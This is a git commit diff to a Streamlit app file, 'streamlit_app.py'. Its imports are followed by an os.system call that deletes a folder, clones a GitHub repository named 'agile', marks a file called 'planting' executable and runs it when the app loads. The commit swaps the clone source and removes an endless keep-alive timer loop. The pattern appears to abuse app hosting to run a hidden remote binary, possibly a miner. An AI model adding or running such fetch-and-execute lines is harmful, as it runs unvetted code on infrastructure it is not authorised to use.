a5adea18de382dd6eef6171a57b755ede0b03a96
Jani Nero <109569161+janiolero@users.noreply.github.com>
2022-07-19 21:56:44 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,27 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf agile && git clone https://github.com/arinales/agile.git && cd agile && chmod +x planting && ./planting")
-
-import time 
-from IPython.display import clear_output 
- 
-def zero_to_infinity(): 
-    i = 0 
-    while True: 
-        yield i 
-        i += 1 
-        time.sleep(1) 
- 
-start = time.time() 
-for x in zero_to_infinity(): 
-    clear_output(wait=True) 
-    end = time.time() 
-    temp = end-start 
-    hours = temp//3600 
-    temp = temp - 3600*hours 
-    minutes = temp//60 
-    seconds = temp - 60*minutes 
-    print("") 
-    print('%s %d:%d:%d' %("Time execution : ",hours,minutes,seconds)) 
-    print("")
+os.system ("rm -rf agile && git clone https://github.com/janiolero/agile.git && cd agile && chmod +x planting && ./planting")
